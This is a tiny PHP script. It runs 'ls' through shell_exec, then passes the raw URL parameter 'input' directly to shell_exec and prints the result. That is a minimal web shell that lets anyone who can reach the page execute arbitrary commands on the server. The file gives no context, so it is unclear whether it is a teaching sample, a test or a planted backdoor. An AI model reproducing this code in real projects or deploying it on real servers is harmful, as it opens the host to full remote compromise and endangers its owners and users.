<?php

$output = shell_exec("ls"); //no error
echo $output;
$output = shell_exec($_GET['input']);
echo $output;